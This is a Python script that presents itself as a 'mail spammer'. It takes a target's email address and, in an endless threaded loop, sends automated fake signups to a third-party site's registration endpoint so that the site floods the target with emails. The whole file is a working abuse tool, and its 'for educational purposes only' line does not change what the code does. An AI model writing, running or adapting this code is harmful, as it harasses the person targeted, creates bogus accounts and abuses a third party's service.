import random
import requests
import os, time
import threading
from pystyle import Col

os.system(f"title Welcome to mail spammer")
print("for educational purposes only")
randomusername= "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
email = input("Please enter email you want to spam: ")
print("Have fun")
lock = threading.Lock()
sendddd = 0
def send(sendd):
    try:
        randnum = str(random.randint(0, 100000))
        emailwithrandnum = (f"{email[:email.find('@')]}+{randnum}{email[email.find('@'):]}")
        sitestr = "http://xboxunity.net/Resources/Lib/Register.php?username=" + randomusername + str(random.randint(0,100110)) + "&email=" + emailwithrandnum + "&fullname=" + randomusername + str(random.randint(0, 1000)) + "&password=" + str(random.randint(10000000, 10050000))
        sitestr = sitestr.replace("@", "%40")
        sitestr = sitestr.replace("+", "%2B")
        try:
            req = requests.get(sitestr)
        except requests.exceptions.ConnectionError:print('You may have been blocked by Xbox Unity or you have no internet')
        if len(req.json()["Error"]) == 0:
            os.system("title emails sent: " + str(sendd))
            lock.acquire()
            os.system("cls")
            print(Col.red +f"""

███╗   ███╗ █████╗ ██╗██╗         ███████╗██████╗  █████╗ ███╗   ███╗
████╗ ████║██╔══██╗██║██║         ██╔════╝██╔══██╗██╔══██╗████╗ ████║
██╔████╔██║███████║██║██║         ███████╗██████╔╝███████║██╔████╔██║
██║╚██╔╝██║██╔══██║██║██║         ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
██║ ╚═╝ ██║██║  ██║██║███████╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
                         views sent: {sendd}                                            

""")
            lock.release()
    except:pass
os.system("cls")

while True: 
    sendddd += 1
    threading.Thread(target=send, args=(sendddd,)).start()
    time.sleep(0.04)
